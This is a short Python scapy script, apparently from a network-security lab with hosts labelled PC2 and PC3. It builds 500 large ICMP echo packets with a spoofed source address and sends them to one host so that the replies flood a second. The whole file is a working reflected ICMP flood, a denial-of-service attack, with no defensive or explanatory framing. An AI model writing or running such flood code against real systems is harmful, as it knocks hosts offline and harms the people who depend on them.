#!/usr/bin/python3

import string
from scapy.all import *
import signal
import sys

signal.signal(signal.SIGINT, lambda s, f: sys.exit(-1))	


resp_sender = "192.168.220.134" # from PC2
resp_recver = "192.168.220.138" # to PC3

msg = ''.join(random.choice(string.ascii_uppercase) for _ in range(65500))

packet = IP(dst=resp_sender, src=resp_recver)/ICMP()/msg


print("Preparing packets")
packets = []
for i in range(0, 500):
	packets.append(IP(dst=resp_sender, src=resp_recver)/ICMP(seq=i)/msg)

print("Sending packets")		
send(packets)


